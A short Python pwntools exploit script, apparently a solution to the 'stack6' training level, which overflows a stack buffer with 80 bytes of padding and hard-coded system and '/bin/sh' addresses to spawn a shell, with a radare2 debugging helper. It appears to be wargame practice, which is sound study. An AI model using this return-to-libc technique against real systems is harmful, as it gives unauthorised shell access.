#!/usr/bin/env python2
# -*- coding: utf-8 -*-

from pwn import *
import os
import sys

_DEBUG = True

io = process('../bin/stack6', aslr=False)

pack = make_packer()
unpack = make_unpacker()

_bin_sh = pack(0x2aa00dc8)
system  = pack(0x2a8deb40)
pop_edx = pack(0x2aa84dca)

def radare2():
    c = "aaaa; db main; "
    c += "db 0x080484f9; "
    c += "db; "

    pid = util.proc.pidof(io)[0]
    os.system('screen r2 -d %d -c "%s"' % (pid, c))
    util.proc.wait_for_debugger(pid)

def exploit():
    io.sendline('A' * 80 + system + 'BBBB' + _bin_sh)
    io.interactive()

if __name__ == "__main__":
    if _DEBUG:
        radare2()
    exploit()
